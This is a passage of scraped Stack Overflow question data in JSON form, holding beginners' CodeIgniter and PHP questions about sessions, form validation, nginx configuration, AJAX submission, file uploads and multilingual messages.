I have a application library such as:</p>\n\n<pre><code>class User\n{\n   // some instance variables\n}\n</code></pre>\n\n<p>Now lets say I want to use codeigniter session class in the User class, basically being able to work with sessions inside the User class.  How can I go about doing this?</p>\n"},{"tags":["forms","codeigniter"],"answer_count":3,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":175,"score":1,"question_id":9486274,"title":"CodeIgniter: how to return data from a form validation callback","body":"<p>Here is my CI form validation rule:</p>\n\n<pre><code>$datetime_string = $this-&gt;form_validation-&gt;set_rules('event_date', 'Select', 'callback_date_validate');\n</code></pre>\n\n<p>Here is my callback:</p>\n\n<pre><code>function date_validate($select_value)\n{\n    $year = '';\n    $month = '';\n    $day = '';\n    $hour = '';\n    $minutes = '';\n\n    $datetime = $this-&gt;input-&gt;post('event_date');\n    if (strpos($datetime, ' @ ') !== 'FALSE' &amp;&amp; $datetime != '')\n    { \n        $datetime_explode = explode(' @ ', $datetime);\n        if (strpos($datetime_explode[0], '/') !== 'FALSE' &amp;&amp; $datetime_explode != '')\n        {\n            $date_explode = explode('/', $datetime_explode[0]);\n            $year = $date_explode[2];\n            $month = $date_explode[1];\n            $day = $date_explode[0];    \n        }\n        if (strpos($datetime_explode[1], ':') !== 'FALSE')\n        {\n            $time_explode = explode(':', $datetime_explode[1]);\n            $hour = $time_explode[0];\n            if (strpos($time_explode[1], ' ') !== 'FALSE')\n            {\n                $minutes_explode = explode(' ', $time_explode[1]);\n                $minutes = $minutes_explode[0];\n                $am_pm = $minutes_explode[1];\n\n                if ($am_pm == 'PM' || $am_pm == 'pm')\n                    $hour += 12;    \n            }\n        }\n    }\n\n    $datetime_string = $year . '-' . $month . '-' . $day . ' ' . $hour . ':' . $minutes . ':00';\n\n    if (!preg_match('/^\\d{4}-\\d{2}-\\d{2} 2[0-3]|[01][0-9]:[0-5][0-9]:[0-5][0-9]$/', $datetime_string))\n    {\n        $this-&gt;form_validation-&gt;set_message('date_validate', 'Oops');\n    }\n    else // user picked something\n    {\n        return $datetime_string;\n    }\n}\n</code></pre>\n\n<p>According to the CI documentation, you can return data from a form validation callback, but by setting the rule equal to a variable, I get this error:</p>\n\n<pre><code>Object of class CI_Form_validation could not be converted to string\n</code></pre>\n\n<p>What am I doing wrong?</p>\n"},{"tags":["php","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":88,"score":2,"question_id":12339486,"title":"Codeigniter 2 $this->ip_address() not returning ip address","body":"<p>Well, I'm trying to log user login history, so for this I need to track user's ip address.\nI used:</p>\n\n<pre><code>$this-&gt;input-&gt;ip_address();\n</code></pre>\n\n<p>This should return the <code>ip address</code> of the machine, if user has valid ip, or should return <code>0.0.0.0</code> if the user doesn't have a valid IP. But in my case it's returning neither.</p>\n\n<p>It is returning just an unusual format.</p>\n\n<pre><code>::1\n</code></pre>\n\n<p>P.S. I'm checking it in my local computer.</p>\n\n<p><strong>EDIT :</strong></p>\n\n<p>Thanks all who commented. But still it is strange things going out here. I have two separate applications running in my same machine. Both applications are made in Codeigniter 2. The first one records <code>0.0.0.0</code> and the second one records <code>::1</code>. Isnt both application should have returned same thing?</p>\n\n<p>Thanks</p>\n"},{"tags":["php","codeigniter","session"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":47,"score":1,"question_id":12935754,"title":"CodeIgniter: controller outputting JS - how to prevent response headers from returning cookie","body":"<p>I have a CI controller that outputs some JS variables (mainly language variables). I set the MIME type using <code>header</code> function, etc. So, it's really JS when it's outputted.</p>\n\n<p>Looking at the header responses, I see session data being returned. As an optimization, I would like to prevent that from being returned (saved a few bytes). Is there a way for me to do this?</p>\n\n<p>For my regular JS, CSS, etc. files, I put them on a sub-domain that does not set session/cookies. But since JS this is coming from my application's controller, it has session data.</p>\n"},{"tags":["codeigniter","nginx","rewrite","fastcgi"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":2536,"score":1,"question_id":3786124,"title":"How do I configure nginx and CodeIgniter?","body":"<p>I'm running nginx on my home computer for development. I also have it linked to DynDNS so I can show progress to my co-worker a bit easier. I can't seem to get nginx to rewrite to CodeIgniter properly. I have CodeIgniters uri_protocol set to REQUEST_URI. </p>\n\n<p>All pages that should be showing up wtih content show up completely blank. If I phpinfo(); die(); in the index.php file of Codeigniter, it works as expected and I get the phpinfo.</p>\n\n<p>Also, pages that should give a 404 give a proper CodeIgniter 404 error.</p>\n\n<p>Here's what I have so far.</p>\n\n<pre><code>user www-data;\nworker_processes  1;\n\nerror_log  /var/log/nginx/error.log;\npid        /var/run/nginx.pid;\n\nevents {\n    worker_connections  1024;\n    # multi_accept on;\n}\n\nhttp {\n    include       /etc/nginx/mime.types;\n\n    access_log  /var/log/nginx/access.log;\n    error_log /var/log/nginx/error.log;\n\n    sendfile        on;\n    #tcp_nopush     on;\n\n    #keepalive_timeout  0;\n    keepalive_timeout  65;\n    tcp_nodelay        on;\n\n    #gzip  on;\n    #gzip_disable \"MSIE [1-6]\\.(?!.*SV1)\";\n\n    root /home/zack/Development/public_html;\n\n    include /etc/nginx/conf.d/*.conf;\n    #include /etc/nginx/sites-enabled/*;\n\n\n    server {\n        listen 80;\n        server_name zackhovatter.dyndns.info;\n\n        index index.php;\n        root /home/zack/Development/public_html;\n\n        location /codeigniter/ {\n            if (!-e $request_filename) {\n                rewrite ^/codeigniter/(.*)$ /codeigniter/index.php/$1 last;\n            }\n        }\n            #this is for the index.php in the root folder\n        location /index.php {\n            fastcgi_pass    127.0.0.1:9000;\n            fastcgi_index   index.php;\n            fastcgi_param   SCRIPT_FILENAME /home/zack/Development/public_html/index.php;\n            include         fastcgi_params;\n        }\n\n        location /codeigniter/index.php {\n            fastcgi_index   index.php;\n            include         fastcgi_params;\n            fastcgi_param   SCRIPT_FILENAME  /home/zack/Development/public_html/codeigniter/index.php;\n            fastcgi_param   REQUEST_URI      $request_uri;\n            fastcgi_param   QUERY_STRING     $query_string;\n            fastcgi_param   PATH_INFO        $document_uri;\n            fastcgi_param   REQUEST_METHOD   $request_method;\n            fastcgi_param   CONTENT_TYPE     $content_type;\n            fastcgi_param   CONTENT_LENGTH   $content_length;\n            fastcgi_pass    127.0.0.1:9000;\n        }\n    }\n}\n</code></pre>\n"},{"tags":["php","codeigniter","codeigniter-2"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":77,"score":2,"question_id":12942248,"title":"Convert function to codeigniter","body":"<p>So I'm new to codeigniter and MVC in general. I have an app that I am converting over and I was wondering what the best way would be to handle this type of function, specifically within the view.</p>\n\n<p>I have a table of categories, that looks like the table below:</p>\n\n<pre><code>cat_id | parent_id | catname\n------------------------------\n1       0           this category\n2       1           that category\n</code></pre>\n\n<p>The function, given a cat_id, spits out a formatted string complete with links. I know I shouldn't be handling the URL items until the view, so I am not sure if I rewrite this in CI how to handle the resulting array in the view.</p>\n\n<p>Thoughts? Original function below:</p>\n\n<pre><code>    function createPath($id, $category_tbl, $except = null) {\n    $s = \"SELECT * FROM \".$category_tbl.\" WHERE cat_id = $id\";\n    $r = mysql_query($s);\n    $row = mysql_fetch_array($r);\n    if($row['parent_id'] == 0) {\n        $name = $row['catname'];\n        if(!empty($except) &amp;&amp; $except == $row['cat_id']) {\n            return \"&lt;a href='index.php'&gt;Admin&lt;/a&gt; &amp;raquo; \".$name.\"\";\n        }\n        //return \"&lt;a href='index.php'&gt;Admin&lt;/a&gt; &amp;raquo; &lt;a href='index.php?folder_id=$id'&gt;\".$name.\"&lt;/a&gt; &amp;raquo; \";\n        return \"&lt;a href='category.php?catid=$id&amp;category=\".$row['slugname'].\"'&gt;\".$name.\"&lt;/a&gt; &amp;raquo; \";\n    } else {\n        if(!empty($except) &amp;&amp; $except == $row['cat_id']) {\n            $name = $row['catname'];\n            return createPath($row['parent_id'],$category_tbl, false). \" $name\";\n        } \n        $name = $row['catname'];\n        return createPath($row['parent_id'],$category_tbl, false). \" &lt;a href='category.php?catid=$id&amp;category=\".$row['slugname'].\"'&gt;\".$name.\"&lt;/a&gt; &amp;raquo;\";\n    }\n}\n</code></pre>\n"},{"tags":["codeigniter","post","multidimensional-array"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":30,"score":0,"question_id":12941836,"title":"CodeIgniter - Store _post data in multidimensional array and displaying","body":"<p>I have a form on my page. On \"submit\" I need to get the post data from the form and store it in a multidimensional array. </p>\n\n<p>This is what I have so far.</p>\n\n<pre><code>//view\n&lt;input type=\"text\" name=\"option[fname]\" /&gt;\n&lt;input type=\"text\" name=\"option[lname]\" /&gt;\n&lt;input type=\"submit\" /&gt;\n\n//controller\n$data['myarray'] = $this-&gt;input-&gt;post('options', TRUE);\n$this-&gt;load-&gt;view('template',$data);\n</code></pre>\n\n<p>Then on \"submit\" we go back to the view and see what we have added.</p>\n\n<pre><code>//view\n&lt;?php\nforeach($myarray as $row){\n    echo $myarray['fname'] . '&lt;br&gt;' . $myarray['lname'];\n}\n?&gt;\n</code></pre>\n\n<p>I want to be able to keep adding to the array each time I hit \"submit\". Right now it is only displaying the last entered data. How do I do that? Thanks?</p>\n"},{"tags":["codeigniter","ckeditor","pyrocms"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":64,"score":1,"question_id":12884418,"title":"PyroCMS CKEditor Formatted Text Type Issues","body":"<p>PyroCMS v2.1</p>\n\n<p>New lines / white space is added in the wysiwyg (ckeditor) when the 'formatted' text type is chosen.  Is there a way to get around this?  </p>\n\n<p>Expected code looks like this:</p>\n\n<pre><code>class person {\n    public $name;\n    function __construct($persons_name) {\n            $this-&gt;name = $persons_name;\n    }\n\n    function set_name($new_name) {\n            $this-&gt;name = $new_name;\n    }\n\n    function get_name() {\n            return $this-&gt;name;\n   }\n\n}\n</code></pre>\n\n<p>But ends up looking like this:</p>\n\n<pre><code>class person {\n\n    public $name;\n\n    function __construct($persons_name) {\n\n            $this-&gt;name = $persons_name;\n\n    }\n\n\n    function set_name($new_name) {\n\n            $this-&gt;name = $new_name;\n\n    }\n\n\n    function get_name() {\n\n            return $this-&gt;name;\n\n   }\n</code></pre>\n\n<p>}</p>\n"},{"tags":["php","ajax","codeigniter"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":12941551,"title":"AJAX request not submitting my form","body":"<p>I have an ajax request which is used to submit a form.</p>\n\n<pre><code>$('#position'+i).change(function () { \n        var data = $(this).attr('value');\n        var form = $('#pages_form');\n        $.ajax({\n            type: \"POST\",\n            url: form.attr('action'),\n            data: data,\n            succes: alert('Postion has been saved')\n        });\n    }); \n</code></pre>\n\n<p>It dosent seem to want to go the the url weather I hard code it or use the form action attribute. What do I need to do to get this to submit my form.</p>\n\n<p>Its weird because if I hit enter it will submit the form but it will bypass the ajax request.</p>\n"},{"tags":["php","jquery","codeigniter","uploadify"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":176,"score":0,"question_id":11183692,"title":"Uploadify How to create a new folder and load files to it","body":"<p><strong>can anyone tell how to pass the value from jquery to uploadify.php <code>dynfolder:$(\"#storeloyaltyid\").val()</code>,//value is photo1 m not able to fetch in uploadify.php</strong></p>\n\n<p>Jquery</p>\n\n<pre><code>if($(\"#uploadphotoz\").length&gt;0){\n\n        uploadphotoz();\n\n    }\n\n    function uploadphotoz(){\n\n        $('#uploadphotoz').Uploadify({\n\n            uploader:urljs+\"/jslib/Uploadify.swf\",\n            cancelImage:urljs+\"/image/cancel.png\",\n            buttonImage:urljs+\"/image/browse_button.png\",\n            uploadUrl:urljs+\"/jslib/uploadify.php\",\n            dynfolder:$(\"#storeloyaltyid\").val(),//value is photo1\n            height  : 21,\n            width   :59,\n            auto    : true,\n            fileLimit:1,\n            preview:'stuimgpreview',\n            onComplete: function(event,status,imgs){   \n                $(\"#memPhoto\").val(imgs);\n            },\n            onRemove:function(event,imgs){\n                $(\"#memPhoto\").val(imgs);\n            }\n        });\n    }\n</code></pre>\n\n<p>uploadify.php</p>\n\n<pre><code>&lt;?php\nif (!empty($_FILES)) {\n\n    $filename = $_FILES['Filedata']['name'];\n    $filetmpname = $_FILES['Filedata']['tmp_name'];\n    $fileType = $_FILES[\"Filedata\"][\"type\"];\n    $fileSizeMB = ($_FILES[\"Filedata\"][\"size\"] / 1024 / 1024);\n\n    // Place file on server, into the images folder\n    //move_uploaded_file($_FILES['Filedata']['tmp_name'], \"../uploaded_photos/\".$filename);\n    $dynfolder=$_POST['dynfolder'];\nmkdir($dynfolder, 0755, true);move_uploaded_file($_FILES['Filedata']['tmp_name'], \"../uploaded_photos\".\"/\".$dynfolder.\"/\".$filename);.../uploaded_photos/photos1/1.jpg\n\n}elseif($_POST['d']){\n    $filename = $_POST['d'];\n    $dynfolder=$_POST['dynfolder'];\nmkdir($dynfolder, 0755, true);\n$dFile=move_uploaded_file($_FILES['Filedata']['tmp_name'], \"../uploaded_photos\".\"/\".$dynfolder.\"/\".$filename);//.../uploaded_photos/photos1/1.jpg\n    unlink($dFile);\n\n}\n?&gt;\n</code></pre>\n\n<p>I am not able to create a new folder called photos1 in uploaded_photos folder... the path should be <code>.../uploaded_photos/photos1/1.jpg</code>  ,<code>dynfolder:$(\"#storeloyaltyid\").val(),//value is photo1</code> ,Can anyone tell what is the problem with the code.</p>\n"},{"tags":["codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":451,"score":0,"question_id":9348541,"title":"Codeigniter extends core class","body":"<p>I want to have class that checks login on all controllers that I specified.\nCodeigniter version is 2.1.0 and I have php 5.3.10</p>\n\n<p>Hier is how I would set it up:\nI look at <a href=\"http://codeigniter.com/user_guide/general/core_classes.html\" rel=\"nofollow\">http://codeigniter.com/user_guide/general/core_classes.html</a>\nand I set it up like this:\nin the /application/core/MY_Main.php</p>\n\n<pre><code>class MY_Main extends CI_Controller {\n\nfunction __construct()\n{\n    parent::__construct();\n}\n}\n</code></pre>\n\n<p>In my controller I have welcome.php</p>\n\n<pre><code>?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');\n\nclass Welcome extends MY_Main {\n\n    function __construct()\n    {\n            parent::__construct();\n    }\n    public function index()\n    {\n            $this-&gt;load-&gt;view('welcome_message');\n    }\n}\n</code></pre>\n\n<p>So if I place login check in MY-Main it should get work, but I cant get it work anyone???</p>\n"},{"tags":["php","mysql","database","codeigniter","group-by"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":57,"score":0,"question_id":12937961,"title":"MySQL GROUP BY and conditions","body":"<p>I would like to group the table below and return parts_number while checking the option value.\nThat is, for parts with same parts_number, same option value be grouped together. No mixing parts_number with different option values.</p>\n\n<pre><code>parts | parts_number | option\nA | 100 |1\nB | 120 |1\nA | 100 |0\nC | 110 |1\nB | 120 |1\nC | 110 |0\nA | 100 |0\nA | 100 |0\nA | 100 |1\n</code></pre>\n\n<p>In the case above I should have my results returning rows as below:</p>\n\n<pre><code>parts | parts_number | option\nA | 100 |1\nB | 120 |1\nA | 100 |0\nC | 110 |1\nC | 110 |0\n\nA =&gt; 2\nB =&gt; 1\nC =&gt; 2\n</code></pre>\n\n<p>Note the grouping while not mixing parts of different options.\nI have tried to group_by parts_number but I am stuck at the point where I have to cater for my options too.</p>\n\n<p>I am using PHP (CodeIgniter) and MySQL. Any help is highly appreciated.</p>\n"},{"tags":["jquery","ajax","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":76,"score":0,"question_id":12923240,"title":"Really simple ajax + codeigniter","body":"<p>I'm trying to learn the fundamentals of ajax but I can't really make it work. Here's what I'm trying.</p>\n\n<p>File:create_comment.php (view)</p>\n\n<pre><code> &lt;!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"&gt;\n&lt;html xmlns=\"http://www.w3.org/1999/xhtml\"&gt;\n&lt;head&gt;\n&lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /&gt;\n\n&lt;script src=\"//ajax.googleapis.com/ajax/libs/jquery/1.8.1/jquery.min.js\"&gt;&lt;/script&gt;\n&lt;script src=\"//ajax.googleapis.com/ajax/libs/jqueryui/1.8.23/jquery-ui.min.js\"&gt;&lt;/script&gt;\n\n&lt;script&gt;\n   $(function(){\n       $(\"#comment\").submit(function(){\n\n         var name = $(\"#name\").val();\n\n\n         $.ajax({\n           type: \"POST\",\n           url: \"&lt;?php echo base_url(); ?&gt;index.php/comment/create\",\n           data: \"name=\"+name,\n           dataType: 'json',\n\n           success: function(result){    \n                $('#write').html(result.returnValue);\n           },\n           error: function(xhr, status, error) { \n                alert('Error: '+ xhr.status+ ' - '+ error); },\n\n         });\n\n         return false;  \n\n      });\n   });\n&lt;/script&gt;\n\n&lt;title&gt;Untitled Document&lt;/title&gt;\n&lt;/head&gt;\n\n&lt;body&gt;\n&lt;h3&gt;New Comment&lt;/h3&gt;\n&lt;form id=\"comment\" method=\"post\"&gt;\n&lt;label&gt;Name: &lt;/label&gt;&lt;input type=\"text\" id=\"name\" name=\"name\" /&gt;&lt;br\n&lt;label&gt;&amp;nbsp;&lt;/label&gt;&lt;input type=\"submit\" value=\"Submit\" /&gt;\n&lt;/form&gt;\n\n&lt;div id=\"write\" &gt;&lt;/div&gt;\n&lt;!-- here is the script that will do the ajax. It is triggered when the form is submitted --&gt;&lt;/body&gt;&lt;/html&gt;\n</code></pre>\n\n<p>File: comment.php (controller)</p>\n\n<pre><code>&lt;?php\n\nclass Comment extends CI_Controller{\n\nfunction  __construct() {\n\n    parent::__construct();\n    $this-&gt;load-&gt;helper('url');\n}\n\nfunction index(){\n\n    $this-&gt;load-&gt;view('create_comment');\n\n\n}\n\nfunction create(){\n\n    if($_POST) {\n           echo json_encode(array(\"returnValue\"=&gt;\"This is returned from PHP\")); \n    }\n}\n\n\n}\n?&gt;\n</code></pre>\n\n<p>What I'm always getting when I submit the for is: Error: 0 - OK\nThis means that I'm not even getting the 'success' function. If instead of echoing, I use 'return', then I'm going into the success function (but obviously I cannot output the results).</p>\n\n<p>I know this must be the easiest question ever but what am I doing wrong?</p>\n"},{"tags":["codeigniter","http-status-code-404","ion-auth"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":28,"score":1,"question_id":12936841,"title":"Ion Auth returns 404 on all views","body":"<p>Hey i'm new to CI and i guess i'm missing some fundemental understanding of CI and MVC in general.</p>\n\n<p>I've copied all the <a href=\"https://github.com/benedmunds/CodeIgniter-Ion-Auth\" rel=\"nofollow\">Ion Auth</a> files to their places, created all tables, created encryption key.</p>\n\n<p>but when i tried to enter any view i get a 404.</p>\n\n<p>Am i suppoused to write anything in my routes file? why could this be?</p>\n"},{"tags":["php","codeigniter","paypal","paypal-ipn"],"answer_count":3,"favorite_count":4,"up_vote_count":4,"down_vote_count":0,"view_count":4202,"score":4,"question_id":3978261,"title":"PayPal IPN with CodeIgniter","body":"<p>I am trying to implement a membership subscription service on a website built in CodeIgniter. I wish to use PayPal to manage payments, and am having a very hard time implementing this.</p>\n\n<p>What I am trying to achieve is:</p>\n\n<ol>\n<li>User fills in a membership form with\npersonal details</li>\n<li>User selects a\nsubscription option (1 of 8 choices - each different price) and submits form</li>\n<li>User is sent to PayPal to pay</li>\n<li>User is returned to site upon successful payment and personal details are stored in database which creates user account (membership).</li>\n</ol>\n\n<p>There is also the addition of form validation, I use the form_validation helper in CodeIgniter, but this needs to be done before PayPal payment can commence.</p>\n\n<p>I have attempted to implement the PayPal_Lib from Ran Aroussi, but I feel it has not enough clear documentation or guidance on it. Any implemented examples or advice would be much appreciated.</p>\n\n<p>Lucas</p>\n"},{"tags":["codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":206,"score":3,"question_id":11161853,"title":"Loading a codeigniter view with a form from inside another view","body":"<p>Using codeigniter, I've been trying to load a view inside of a foreach loop, as follows:</p>\n\n<pre><code>$posts = $this-&gt;postslibrary-&gt;getAllPosts();\nforeach($posts as $post){\n  $home['content'][$i] = $this-&gt;load-&gt;view('post', $post['data'], true);\n  $i++;\n}\n$this-&gt;load-&gt;view('head');\n$this-&gt;load-&gt;view('home', $home);\n$this-&gt;load-&gt;view('footer');\n</code></pre>\n\n<p>Each of those post views looks a little like this:</p>\n\n<pre><code>&lt;div class=\"postnum&lt;?=$post_num?&gt;\"&gt;\n  &lt;p&gt;Posted by: &lt;?=$poster_name?&gt;&lt;/p&gt;\n  &lt;p&gt;Reply to: &lt;?=$poster_name?&gt;&lt;/p&gt;\n  &lt;form&gt;\n  &lt;input type='text' /&gt;\n  &lt;input type='submit' /&gt;\n  &lt;/form&gt;\n&lt;/div&gt;\n</code></pre>\n\n<p>And they're being loaded mostly successfully in the 'home' view (which is below for thoroughness).</p>\n\n<pre><code>&lt;div =\"posts\"&gt;\n  &lt;?php\n    for($i=0;$i&lt;$count;$i++)\n    {\n      echo($content[$i]);\n    }\n  ?&gt;\n  &lt;div class=\"clear\"&gt;&lt;/div&gt;\n  &lt;a href='/posts/browse/'&gt;Load more items&lt;/a&gt;\n&lt;/div&gt;\n</code></pre>\n\n<p>But my output ends up looking like:</p>\n\n<pre><code>&lt;div class='posts'&gt;\n  &lt;div class='postnum1'&gt;\n    &lt;p&gt;Posted By: Jim&lt;/p&gt;\n    &lt;p&gt;Reply to Jim&lt;/p&gt;\n    &lt;input type='text' /&gt;\n    &lt;input type='submit' /&gt;\n  &lt;/div&gt;\n&lt;/div&gt;\n</code></pre>\n\n<p>Why are my form tags not coming through?</p>\n"},{"tags":["php","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":65,"score":0,"question_id":12098598,"title":"Codeigniter - Memory exhausted","body":"<p>I'm currently working with Codeigniter and a MSSQL database connection. Sometimes, I get this error message :</p>\n\n<blockquote>\n  <p>PHP Fatal error:  Allowed memory size of 134217728 bytes exhausted (tried to allocate 139817425963032 bytes) in Unknown on line 0.</p>\n</blockquote>\n\n<p>I'm overwhelmed by the idea that the application needs <strong>139817425963032 bytes</strong> (130 Tb) to work.</p>\n\n<p>Can someone help me ?</p>\n"},{"tags":["php","codeigniter","session"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":68,"score":0,"question_id":12908580,"title":"Cant access codeigniter session variable until page refresh","body":"<p>Am using codeigniter to build an eCommerce site.\nI have a method on controller where users enter their delivery information before checkout, the method saves the delivery information and creates a new session variable called \"orderid\" which has the value of the orderid as its value. After setting the session variable the method redirects to the checkout controller where i retrieve the \"orderid\" from the session to retrieve the order from the db for the user to confirm the information before paying.</p>\n\n<p>The problem is, when the user is redirected to the checkout page, they dont see their delivery  data.\nWhen do this</p>\n\n<pre><code>echo $this-&gt;session-&gt;userdata('orderid');\n</code></pre>\n\n<p>I can see the value\nBut when i pass it to my method that supposed to return an array of data</p>\n\n<pre><code>$order = $this-&gt;orders-&gt;get_order($this-&gt;session-&gt;userdata('orderid'));\nprint_r($order);\n</code></pre>\n\n<p>I get an empty array <code>array()</code></p>\n\n<p>When the checkout page is refreshed it behaves correctly.\nWhat could be the problem</p>\n"},{"tags":["image","codeigniter","upload"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":45,"score":0,"question_id":12930583,"title":"codeigniter image upload successful, but file not uploaded","body":"<p>I have been trying to upload an image using CodeIgniter's File Upload class. The image is used for a user's avatar. Here is a snippet for my code:</p>\n\n<pre><code>//upload file\n            if($_FILES['image']['name'] != ''){\n                if (!file_exists($dirpath))\n                    mkdir($dirpath);\n\n                $this-&gt;load-&gt;library('upload');\n                $config['upload_path'] = $dirpath;\n                $config['allowed_types'] = 'gif|jpg|jpeg|png|GIF|JPG|JPEG|PNG';\n                $config['max_size'] = '0';\n                $config['max_width'] = '0';\n                $config['max_height'] = '0';\n                $config['file_name'] = $_FILES['image']['name'];\n                $config['overwrite'] = true;\n                $config['remove_spaces'] = false;\n\n                $this-&gt;upload-&gt;initialize($config);\n                $data = \"\";\n                $error = \"\";\n\n                $photo_result = $this-&gt;upload-&gt;do_upload('image');\n                if ($photo_result)\n                    if($action == 'update'){\n                        foreach (glob($dirpath.'/'.$old_image.'*') as $file)\n                            if (file_exists($file))unlink ($file);\n                    }\n                    if($new_resto-&gt;resized == 0){\n                        if(resize_image($widths,$theuser))\n                            $this-&gt;usermodel-&gt;update($theuser-&gt;id, array('resized'=&gt;1), 'object',$authorization);\n                    }\n                echo json_encode(array('config'=&gt;$config,'upload_data'=&gt;$this-&gt;upload-&gt;data()));\n                }\n            }\n</code></pre>\n\n<p>The file upload is supposedly successful, because when I print out <code>$this-&gt;upload-&gt;data()</code>, it shows that the upload data is not empty. The strange thing is, this code works for creating new users, but when I try to update users, the file is not uploaded. I have tried using <code>chmod($dirpath, 0777)</code> before the upload, and <code>chmod($dirpath, 0755)</code> after, still no luck.</p>\n\n<p>Any ideas? Thanks.</p>\n"},{"tags":["forms","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":35,"score":0,"question_id":12929039,"title":"Form action duplicates url","body":"<p>new to CI and for some reason the form submits to a wrong url.</p>\n\n<p>the result is : <code>http://localhost/ci/index.php/subjects/localhost/ci/index.php/do_upload</code></p>\n\n<p>and can't understand why.\nThis is the html code :</p>\n\n<pre><code>        echo form_open_multipart('do_upload');\n    ?&gt;\n    &lt;input type=\"file\" name=\"files[]\" id=\"fileupload\" \n style=\"position:absolute; top:-200px\" multiple /&gt; \n    &lt;input type=\"submit\" id=\"uploadFile\" style=\"position:absolute; top:-200px\" /&gt;\n    &lt;?php echo form_close(); ?&gt;\n</code></pre>\n\n<p>Any help?</p>\n\n<p>I've also tried to write <code>subjects/do_upload</code> on form open, same thing.</p>\n"},{"tags":["php","codeigniter","codeigniter-2","hmvc"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":45,"score":0,"question_id":12933884,"title":"Using HMVC & Query Strings together in Codeigniter","body":"<p>I want to use <code>HMVC</code> and <code>'enable_query_strings'</code> configuration (when it has been set <code>TRUE</code> of course) together. So where I am wrong?</p>\n\n<p>NOTE: index.php has been removed via htaccess before.</p>\n\n<p><strong>My Directory Tree</strong>:</p>\n\n<pre><code>- modules\n  - manage\n    -controllers\n      - localization.php\n</code></pre>\n\n<p><strong>My localization.php</strong>:</p>\n\n<pre><code>class Localization extends MX_Controller{\nfunction languages($param = ''){\n...\n}\n}\n</code></pre>\n\n<p><strong>My URL that I tried</strong>: </p>\n\n<pre><code>siteurl/manage?c=localization&amp;m=languages&amp;param=list\n</code></pre>\n"},{"tags":["php","database","query","codeigniter","fatal-error"],"answer_count":4,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":74,"score":3,"question_id":12931555,"title":"Codeigniter Fatal error: Call to a member function query() on a non-object","body":"<p>Now I am learning Codeigniter. I have more databases, so I choosed this time Anketa one.\nWhy is error :</p>\n\n<pre><code>**Fatal error: Call to a member function query() on a non-object in /var/www/domains/svastara/application/controllers/anketa.php on line 12** ???\n</code></pre>\n\n<p>I chacked, the user and pass in database is ok, database is loaded in conf, and chacked the table name. So what more?</p>\n\n<pre><code>$this-&gt;db = $this-&gt;load-&gt;database('anketa');\n\n        $q = $this-&gt;db-&gt;query(\"SELECT * FROM anketaip\");\n\n        if($q-&gt;num_rows()&gt;0){\n        foreach ($q-&gt;result() as $row)\n        {\n            $data[] = $row;\n        }\n\n        }return $data;\n\n        $this-&gt;load-&gt;view('anketa_nova', $data);\n</code></pre>\n"},{"tags":["php","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":54,"score":0,"question_id":12928891,"title":"Use The Language Key In controller of codeigniter","body":"<p>I have an application build in Codeigniter framework.which have functionality of multi language.It works fine In view to convert the each line.<strong>But for alert messages which is set from controller i try to use the language key but failed to show the message on view in multi language.</strong> </p>\n\n<p>Here is the code of controller from the message has been set to show on view:-</p>\n\n<p>the function of controller to set the message:</p>\n\n<pre><code>function serial_coupon()\n    {\n     $admin_session_data= $this-&gt;session-&gt;userdata('user_logged_in');\n     $key=$this-&gt;input-&gt;post('serial');\n     $res=explode(\"000\",$key);\n     $key=$res[1];\n     $result['coupon']=$this-&gt;provider_model-&gt;get_coupon($key);\n          if(empty($result['coupon']))\n           {\n                       $msg=$this-&gt;lang-&gt;line('language_srch_msg');\n               $this -&gt; session -&gt; set_flashdata('message',$msg);//if no search found than set the message.\n               redirect('/provider/');//provider is controller\n           }\n           else\n           {\n\n               $this-&gt;load-&gt;view('header',$admin_session_data);\n               $this-&gt;load-&gt;view('show_coupon',$result);\n               $this-&gt;load-&gt;view('footer',$admin_session_data);\n           }\n    }\n</code></pre>\n\n<p>Hence it comes to the Provider controller's Index Function to send the message on view:-</p>\n\n<pre><code>function index()\n        {\n            $msg=$this-&gt;session-&gt;flashdata('message');//get the message \n            $result['msg']=$msg;and set to the array to send in view\n\n                $result['rows']=$this-&gt;session-&gt;userdata('provider_detail');\n        $user_id=$result['rows'][0]['id'];\n            $result['coupons']=$this-&gt;provider_model-&gt;show_coupons($user_id);\n            $this-&gt;load-&gt;view('header');\n            $this-&gt;load-&gt;view('provider_interface',$result);\n        $this-&gt;load-&gt;view('footer');\n\n    }\n</code></pre>\n\n<p>So the message should be display in view:</p>\n\n<pre><code>&lt;p&gt;&lt;?php echo $msg; ?&gt;&lt;/p&gt;\n</code></pre>\n\n<p>And the other lines where i am using language key Like:\nfor 